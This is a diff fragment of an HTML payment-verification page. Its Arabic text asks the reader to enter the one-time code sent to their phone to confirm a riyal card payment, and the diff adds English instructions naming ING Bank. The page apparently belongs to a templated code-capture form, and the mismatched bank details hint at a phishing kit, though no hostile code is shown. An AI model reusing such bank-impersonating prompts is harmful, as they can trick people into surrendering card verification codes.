@@ -29572,7 +29572,9 @@
 																											لسداد مبلغ قيمته SAR <br>
 																											باستخدام البطاقة المنتهية برقم <span id="cardLast4"></span><br>
 																											لتأكيد العملية ادخل رمز التحقق المرسل إلى جوالك.</div>
-																											
+																											To complete verification with ING Bank, 
+																											you will need to follow the instructions provided by ING, 
+																											which may involve using the ING app
                                                                                                                           
                                                                                                                             <!---->
                                                                                                                         </div>
